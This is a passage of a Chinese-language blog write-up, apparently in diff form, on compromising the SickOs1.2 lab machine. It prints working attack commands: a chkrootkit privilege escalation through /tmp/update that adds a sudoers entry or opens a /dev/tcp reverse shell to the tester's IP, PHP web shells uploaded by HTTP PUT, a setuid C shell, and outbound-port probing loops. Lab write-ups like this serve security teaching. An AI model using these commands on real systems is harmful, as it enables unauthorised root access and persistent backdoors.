have to see, if I reach a dev there.<br></code></pre></td></tr></table></figure>
+<p>根据脚本描述，目标靶机的 Chkrootkit 会周期性以 root 身份执行 <code>/tmp/update</code> 文件 。</p>
+<p>查看 tmp 目录是否可执行，创建  <code>/tmp/update</code> 文件，用于将当前用户写入 <code>/etc/sudoers</code> 文件，这样就可以直接 sudo提权了。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ls -l / | grep tmp</span>      <br>drwxrwxrwt   4 root root  4096 Jul  4 10:54 tmp<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;chmod +w /etc/sudoers &amp;&amp; echo &quot;www-data ALL=(ALL) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers &amp;&amp; chmod 440 /etc/sudoers&#x27;</span> &gt; /tmp/update</span><br><span class="hljs-meta">$</span><span class="bash"> cat /tmp/update</span><br>chmod +w /etc/sudoers &amp;&amp; echo &quot;www-data ALL=(ALL) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers &amp;&amp; chmod 440 /etc/sudoers<br></code></pre></td></tr></table></figure>
+<p>然后不成功，换成 bash 反弹依旧不行。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo su</span><br>sudo: no tty present and no askpass program specified<br>Sorry, try again.<br>sudo: no tty present and no askpass program specified<br>Sorry, try again.<br>sudo: no tty present and no askpass program specified<br>Sorry, try again.<br>sudo: 3 incorrect password attempts<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;#!/bin/bash\nbash -i &gt;&amp; /dev/tcp/192.168.135.141/443 0&gt;&amp;1\n&#x27;</span> &gt; /tmp/update</span><br><span class="hljs-meta">$</span><span class="bash"> cat /tmp/update</span><br><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>bash -i &gt;&amp; /dev/tcp/192.168.135.141/8080 0&gt;&amp;1<br></code></pre></td></tr></table></figure>
+<p>在折腾好久之后发现 <code>/tmp/update</code> 文件没有执行权限，居然犯了这种低级错误，加了权限后成功进入 root ：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ls -l /tmp/update</span><br>-rw-rw-rw- 1 www-data www-data 81 Jul  4 11:19 /tmp/update<br><span class="hljs-meta">$</span><span class="bash"> chmod +x /tmp/update</span><br><span class="hljs-meta">$</span><span class="bash"> ls -l /tmp/update</span><br>-rwxrwxrwx 1 www-data www-data 81 Jul  4 11:19 /tmp/update<br><span class="hljs-meta">$</span><span class="bash"> sudo su</span><br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>root<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>uid=0(root) gid=0(root) groups=0(root)<br><span class="hljs-meta">$</span><span class="bash"> ls /root</span><br>304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz<br>7d03aaa2bf93d80040f3f22ec6ad9d5a.txt<br>chkrootkit-0.49<br>newRule<br><span class="hljs-meta">$</span><span class="bash"> cat /root/7d03aaa2bf93d80040f3f22ec6ad9d5a.txt</span><br>WoW! If you are viewing this, You have &quot;Sucessfully!!&quot; completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.<br><br>Thanks for giving this try.<br><br>@vulnhub: Thanks for hosting this UP!.<br></code></pre></td></tr></table></figure>
+<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>1、PUT 方式文件上传：curl</p>
+<p>2、反弹 shell 端口受限，可以尝试更换常用端口</p>
+<p>3、计划任务：<code>ls -l /etc | grep cron</code></p>
+<p>4、Chkrootkit 提权：追加当前用户至 sudoer ，sudo 提权</p>
+<h2 id="五、Others"><a href="#五、Others" class="headerlink" title="五、Others"></a>五、Others</h2><h3 id="1、PUT-方法上传"><a href="#1、PUT-方法上传" class="headerlink" title="1、PUT 方法上传"></a>1、PUT 方法上传</h3><p><strong>M1：通过 burpsuite 使用 PUT 方法上传</strong></p>
+<p>抓包 —&gt; 更改为 PUT 请求、添加一句话木马 —&gt; 上传成功</p>
+<p><strong>M2：通过 nmap 使用 PUT 方法上传</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -p 80 192.168.202.13 --script http-put --script-args http-put.url=<span class="hljs-string">&#x27;/test/shell.php&#x27;</span>,http-put.file=<span class="hljs-string">&#x27;/home/kali/shell.php&#x27;</span></span><br></code></pre></td></tr></table></figure>
+<p><strong>M3：通过 curl 命令使用 PUT 方法上传</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -X PUT -d <span class="hljs-string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> http://192.168.135.154/<span class="hljs-built_in">test</span>/shell1.php</span><br><span class="hljs-meta">$</span><span class="bash"> curl -i -X PUT -H <span class="hljs-string">&quot;Content-Type: text/plain; charset=utf-8&quot;</span> -d <span class="hljs-string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> http://192.168.135.154/<span class="hljs-built_in">test</span>/shell2.php</span><br><span class="hljs-meta">$</span><span class="bash"> curl -v --upload-file shell.php --url http://192.168.202.13/<span class="hljs-built_in">test</span>/shell1.php -0 --http1.0</span><br><span class="hljs-meta">$</span><span class="bash"> curl -v -H <span class="hljs-string">&#x27;Expect:&#x27;</span> -T shell.php http://192.168.202.13/<span class="hljs-built_in">test</span>/</span><br></code></pre></td></tr></table></figure>
+<h3 id="2、提权"><a href="#2、提权" class="headerlink" title="2、提权"></a>2、提权</h3><p><strong>M1：bash 反弹</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;#!/bin/bash\nbash -i &gt;&amp; /dev/tcp/192.168.135.141/443 0&gt;&amp;1\n&#x27;</span> &gt; /tmp/update</span><br></code></pre></td></tr></table></figure>
+<p>然后监听 8080 端口就可以得到 root 权限的 shell 。</p>
+<p><strong>M2：追加当前用户至 sudoer </strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;chmod +w /etc/sudoers &amp;&amp; echo &quot;www-data ALL=(ALL) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers&#x27;</span> &gt; /tmp/update</span><br></code></pre></td></tr></table></figure>
+<p><strong>M3：C</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>	system(<span class="hljs-string">&quot;chown root:root /tmp/update&quot;</span>);<br>	system(<span class="hljs-string">&quot;chmod 4755 /tmp/update&quot;</span>);<br>	setuid(<span class="hljs-number">0</span>);<br>	setgid(<span class="hljs-number">0</span>);<br>	execl(<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;sh&quot;</span>,<span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="3、chkrootkit"><a href="#3、chkrootkit" class="headerlink" title="3、chkrootkit"></a>3、chkrootkit</h3><blockquote>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/elephantxiang/article/details/122463492">https://blog.csdn.net/elephantxiang/article/details/122463492</a></p>
+</blockquote>
+<p>突然有个疑惑，chkrootkit 不是每天执行一次吗？为什么创建 update 没多久就可以实现提权了 ？最终在一篇文章中找到答案。</p>
+<p>看了一下 <code>/etc/cron.daily/chkrootkit</code> 的内容，配合 <code>/etc/chkrootkit.conf</code> 文件，发现 <code>/etc/cron.daily/chkrootkit</code> 实际上根本不会被执行 。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /etc/cron.daily/chkrootkit</span><br><span class="hljs-meta">#</span><span class="bash">!/bin/sh</span><br><br>set -e<br><br>CHKROOTKIT=/usr/sbin/chkrootkit<br>CF=/etc/chkrootkit.conf<br>LOG_DIR=/var/log/chkrootkit<br><br>if [ &quot;$RUN_DAILY&quot; = &quot;true&quot; ]; then<br>    if [ &quot;$DIFF_MODE&quot; = &quot;true&quot; ]; then<br>                                eval $CHKROOTKIT $RUN_DAILY_OPTS &gt; $LOG_DIR/log.today.raw 2&gt;&amp;1<br><br>[......]<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat /etc/chkrootkit.conf</span><br>RUN_DAILY=&quot;false&quot;<br>RUN_DAILY_OPTS=&quot;-q&quot;<br>DIFF_MODE=&quot;false&quot;<br></code></pre></td></tr></table></figure>
+<p>突然想起来，提权之前 <code>/etc/cron.d</code> 是没有权限查看的，在 root 权限下查看：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ls -l /etc/cron.d</span><br>total 8<br>-rwx------ 1 root root  36 Apr 12  2016 chkrootkit<br>-rwx------ 1 root root 544 Oct 27  2015 php5<br><span class="hljs-meta">$</span><span class="bash">cat /etc/cron.d/chkrootkit</span><br>* * * * * root /usr/sbin/chkrootkit<br></code></pre></td></tr></table></figure>
+<p>发现 <code>/etc/cron.d</code> 下面还有个 chkrootkit ，果然是这货在每分钟执行一次 chkrootkit 。</p>
+<h3 id="4、出站端口受限"><a href="#4、出站端口受限" class="headerlink" title="4、出站端口受限"></a>4、出站端口受限</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_15127601/2756621">照弹不误：出站端口受限环境下反弹Shell的思考</a></p>
+</blockquote>
+<p>虽然试了几个端口后找到了可以允许出站的端口，但如果不是 8080 这种常用的特殊端口，而是例如 15682 这种端口，通过几次尝试肯定找不到，还是要想个方法来找到一个可用的端口。</p>
+<h4 id="批量端口探测"><a href="#批量端口探测" class="headerlink" title="批量端口探测"></a>批量端口探测</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;80,81&#125;; <span class="hljs-keyword">do</span> timeout 1 bash -c <span class="hljs-string">&quot;echo &gt;  /dev/tcp/192.168.135.141/<span class="hljs-variable">$i</span>&quot;</span> &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$i</span> open&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$i</span> close&quot;</span>;<span class="hljs-keyword">done</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;80..83&#125;; <span class="hljs-keyword">do</span> timeout 1 bash -c <span class="hljs-string">&quot;echo &gt;  /dev/tcp/192.168.135.141/<span class="hljs-variable">$i</span>&quot;</span> &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$i</span> open&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$i</span> close&quot;</span>;<span class="hljs-keyword">done</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-keyword">for</span> ((i=80;<span class="hljs-variable">$i</span>&lt;83;i++)); <span class="hljs-keyword">do</span> timeout 1 bash -c <span class="hljs-string">&quot;echo &gt;  /dev/tcp/192.168.135.141/<span class="hljs-variable">$i</span>&quot;</span> &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$i</span> open&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$i</span> close&quot;</span>;<span class="hljs-keyword">done</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(seq 80 83); <span class="hljs-keyword">do</span> timeout 1 bash -c <span class="hljs-string">&quot;echo &gt;  /dev/tcp/192.168.135.141/<span class="hljs-variable">$i</span>&quot;</span> &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$i</span> open&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$i</span> close&quot;</span>;<span class="hljs-keyword">done</span></span><br></code></pre></td></tr></table></figure>
+<h4 id="批量捆绑监听端口"><a href="#批量捆绑监听端口" class="headerlink" title="批量捆绑监听端口"></a>批量捆绑监听端口</h4><blockquote>
+<p>如果能够把多个端口流量转发至单个汇聚端口，就只需监听单个汇聚端口，目标上发起多个端口探测，只要在转发的多个端口的范围内，那么，一旦找到有效出站端口，汇聚端口一定有访问记录。</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 重启之后设置失效，不用自己进行备份和恢复, 设置就会恢复</span> <br><span class="hljs-meta">#</span><span class="bash"> sudo iptables-save &gt; /tmp/firwall.rules</span><br><span class="hljs-meta">#</span><span class="bash"> sudo iptables-restore &lt; /tmp/firwall.rules</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="hljs-meta">$</span><span class="bash"> sudo iptables -A PREROUTING -t nat -p tcp --dport 1:65535 -j REDIRECT --to-port 4444</span><br></code></pre></td></tr></table></figure>
+<h4 id="进行测试"><a href="#进行测试" class="headerlink" title="进行测试"></a>进行测试</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lvp 80</span>                                                                              <br>listening on [any] 80 ...<br>^C<br><br>wzz@ubuntu:~$ for i in &#123;80,81&#125;; do timeout 1 bash -c &quot;echo &gt;  /dev/tcp/192.168.135.141/$i&quot; &amp;&amp; echo &quot;$i open&quot; || echo &quot;$i close&quot;;done<br>bash: connect: Connection refused<br>bash: /dev/tcp/192.168.135.141/80: Connection refused<br>80 close<br>bash: connect: Connection refused<br>bash: /dev/tcp/192.168.135.141/81: Connection refused<br>81 close<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> nc -lvp 4444</span><br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from 192.168.135.135 [192.168.135.135] 50430<br><br>wzz@ubuntu:~$ for i in &#123;80,81&#125;; do timeout 1 bash -c &quot;echo &gt;  /dev/tcp/192.168.135.141/$i&quot; &amp;&amp; echo &quot;$i open&quot; || echo &quot;$i close&quot;;done<br>80 open<br>bash: connect: Connection refused<br>bash: /dev/tcp/192.168.135.141/81: Connection refused<br>81 close<br></code></pre></td></tr></table></figure>
+<p>成功实现，接下来就是直接上靶机进行探测</p>
+<h4 id="靶机探测"><a href="#靶机探测" class="headerlink" title="靶机探测"></a>靶机探测</h4><p>为方便操作，上传木马，用 weevely 进行连接：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -v -H <span class="hljs-string">&#x27;Expect:&#x27;</span> -T hello.php http://192.168.135.154/<span class="hljs-built_in">test</span>/</span><br>*   Trying 192.168.135.154:80...<br>* Connected to 192.168.135.154 (192.168.135.154) port 80 (#0)<br><span class="hljs-meta">&gt;</span><span class="bash"> PUT /<span class="hljs-built_in">test</span>/hello.php HTTP/1.1</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Host: 192.168.135.154</span><br><span class="hljs-meta">&gt;</span><span class="bash"> User-Agent: curl/7.83.0</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Accept: */*</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Content-Length: 744</span><br><span class="hljs-meta">&gt;</span><span class="bash"> </span><br>* We are completely uploaded and fine<br>* Mark bundle as not supporting multiuse<br>&lt; HTTP/1.1 201 Created<br>&lt; Content-Length: 0<br>&lt; Date: Mon, 04 Jul 2022 15:43:44 GMT<br>&lt; Server: lighttpd/1.4.28<br>&lt; <br>* Connection #0 to host 192.168.135.154 left intact<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> weevely http://192.168.135.154/<span class="hljs-built_in">test</span>/hello.php <span class="hljs-built_in">test</span></span><br><br>[+] weevely 4.0.1<br><br>[+] Target:     www-data@ubuntu:/var/www/test<br>[+] Session:    /home/kali/.weevely/sessions/192.168.135.154/hello_0.session<br>[+] Shell:      System shell<br><br>[+] Browse the filesystem or execute commands starts the connection<br>[+] to the target. Type :help for more information.<br><span class="hljs-meta"></span><br><span class="hljs-meta">weevely&gt;</span><span class="bash"> ls</span><br>hello.php<br>php-reverse-shell.php<br>wzz.php<br>wzz1.sh<br>wzz2.sh<br>wzz3.sh<br></code></pre></td></tr></table></figure>
+<p>之前已经测试得到了 8080 端口是可以反弹的，现在进行测试：</p>
+<p>kali 端：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lvp 4444</span><br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from 192.168.135.135 [192.168.135.135] 50430<br></code></pre></td></tr></table></figure>
+<p>靶机端：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@ubuntu:/var/www/test $ for i in $(seq 8079 8081); do timeout 1 bash -c &quot;echo &gt;  /dev/tcp/192.168.135.141/$i&quot; &amp;&amp; echo &quot;$i open&quot; || echo &quot;$i close&quot;;done<br>8079 close<br>8080 open<br>8081 close<br>www-data@ubuntu:/var/www/test $ for i in $(seq 8079 8081); do timeout 1 bash -c &quot;echo &gt;  /dev/tcp/192.168.135.141/$i&quot; &amp;&amp; echo &quot;$i open&quot; || echo &quot;$i close&quot;;done<br>8079 close<br>bash: connect: Connection refused<br>bash: /dev/tcp/192.168.135.141/8080: Connection refused<br>8080 close<br>8081 close<br></code></pre></td></tr></table></figure>
+<p>在测试中发现，可能由于防火墙的原因，如果 kali 不进行监听，在探测允许出站的目的端口时，那么会出现 <code>Connection refused</code> 的提示，而在探测不允许出站的目的端口时，却不会显示。</p>
+<p>这样的话，就可以直接探测，kali 不用监听，出现错误的端口就是允许出站的目的端口 。</p>
+<p>对探测语句进行修改：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(seq 1 65535); <span class="hljs-keyword">do</span> timeout 0.01 bash -c <span class="hljs-string">&quot;echo &gt;  /dev/tcp/192.168.135.141/<span class="hljs-variable">$i</span>&quot;</span>;<span class="hljs-keyword">done</span></span><br></code></pre></td></tr></table></figure>
+<p>靶机执行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@ubuntu:/var/www/test $ for i in $(seq 1 65535); do timeout 0.01 bash -c &quot;echo &gt;  /dev/tcp/192.168.135.141/$i&quot;;done<br>bash: connect: Connection refused<br>bash: /dev/tcp/192.168.135.141/443: Connection refused<br>bash: connect: Connection refused<br>bash: /dev/tcp/192.168.135.141/8080: Connection refused<br></code></pre></td></tr></table></figure>
+<p>成功得到两个可以出站的端口 。</p>
+<p>查看防火墙文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ls /root</span><br>304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz<br>7d03aaa2bf93d80040f3f22ec6ad9d5a.txt<br>chkrootkit-0.49<br>newRule<br><span class="hljs-meta">$</span><span class="bash"> cat /root/newRule</span><br><span class="hljs-meta">#</span><span class="bash"> Generated by iptables-save v1.4.12 on Mon Apr 25 22:48:24 2016</span><br>*filter<br>:INPUT DROP [0:0]<br>:FORWARD ACCEPT [0:0]<br>:OUTPUT DROP [0:0]<br>-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT<br>-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT<br>-A INPUT -p tcp -m tcp --sport 8080 -j ACCEPT<br>-A INPUT -p tcp -m tcp --sport 443 -j ACCEPT<br>-A OUTPUT -p tcp -m tcp --sport 22 -j ACCEPT<br>-A OUTPUT -p tcp -m tcp --sport 80 -j ACCEPT<br>-A OUTPUT -p tcp -m tcp --dport 8080 -j ACCEPT<br>-A OUTPUT -p tcp -m tcp --dport 443 -j ACCEPT<br>COMMIT<br><span class="hljs-meta">#</span><span class="bash"> Completed on Mon Apr 25 22:48:24 2016</span><br></code></pre></td></tr></table></figure>
+<p>没毛病，允许出站的目的端口全部找到，但也的确太耗时间了，这里是为了测试这种方法的正确性进行了全部测试，真正使用时只需找到一个可以出站的端口就可以了，不用进行全部端口的探测，可以依照 “重要程度” 分批次对端口进行探测，”重要程度” 可以参照 nmap 的规则。</p>
+<h4 id="猜测的端口范围"><a href="#猜测的端口范围" class="headerlink" title="猜测的端口范围"></a>猜测的端口范围</h4><p>目标既然允许访问外部的几个端口，一定是那些端口提供目标所需服务，那么，我没必要一开始就到 [1, 65535] 中去找有效端口，而是根据服务的常见程度，将所有端口划为几个层次，依次逐层猜解。</p>
+<p>第一层，最常见端口。经验来看，DNS 的 53、HTTP 服务的默认端口 80、HTTPS 的 443 是三个最常见的出站端口。</p>
+<p>第二层，较常见端口。大概包括如下几类：</p>
+<ul>
+<li><p>web 服务， HTTP 的 80、HTTPS 的 443；</p>
+</li>
+<li><p>中间件服务，weblogic 的 7001/7002、webshpere 的 9080/9090、jboss 的 8080；</p>
+</li>
+<li>远程管理服务，SSH 的 22、telnet 的 23、SNMP 的 161、RDP 的 3389；</li>
+<li>数据传输服务，FTP 的 21、SCP/SFTP 的 22、SMB 的 137/138/139/445；</li>
+<li>数据库服务，mssql 的 1433、mysql 的 3306、oracle 的 1521、LDAP 的 389；</li>
+<li>缓存服务，redis 的 6379、memcached 的 11211；</li>
+<li>邮件服务，SMTP 的 25、POP3 的 110、IMAP 的 143；</li>
+<li>其他服务，DNS 的 53、NTP 的 123、kerberos 的 88；</li>
+</ul>
+<p>第三层，top100 常见端口。nmap 默认扫描 top1000 常见端口，通过 —top-ports 选项可以指定扫描更多常见端口。也就是说，nmap 内部梳理了一份已知服务默认端口列表，并且还能按常见程度排序，简直巴适，要获取 top100 常见端口：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -n --top-ports 100 127.0.0.1 -oA foo &gt; /dev/null</span><br><span class="hljs-meta">$</span><span class="bash"> grep -i <span class="hljs-string">&quot;services\=&quot;</span> foo.xml | sed -r <span class="hljs-string">&#x27;s/.*services\=\&quot;(.*)(\&quot;\/&gt;)/\1/g&#x27;</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> nmap -n --top-ports 100 127.0.0.1 -oA foo &gt; /dev/null</span><br><span class="hljs-meta">$</span><span class="bash"> grep -i <span class="hljs-string">&quot;services\=&quot;</span> foo.xml | sed -r <span class="hljs-string">&#x27;s/.*services\=\&quot;(.*)(\&quot;\/&gt;)/\1/g&#x27;</span></span><br>7,9,13,21-23,25-26,37,53,79-81,88,106,110-111,113,119,135,139,143-144,179,199,389,427,443-445,465,513-515,543-544,548,554,587,631,646,873,990,993,995,1025-1029,1110,1433,1720,1723,1755,1900,2000-2001,2049,2121,2717,3000,3128,3306,3389,3986,4899,5000,5009,5051,5060,5101,5190,5357,5432,5631,5666,5800,5900,6000-6001,6646,7070,8000,8008-8009,8080-8081,8443,8888,9100,9999-10000,32768,49152-49157<br></code></pre></td></tr></table></figure>
+<p>采用相同思路，我可以持续探测 top200、top400 常见端口。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Penetration/">Penetration</a>
+                    
+                  </div>
+                
+                
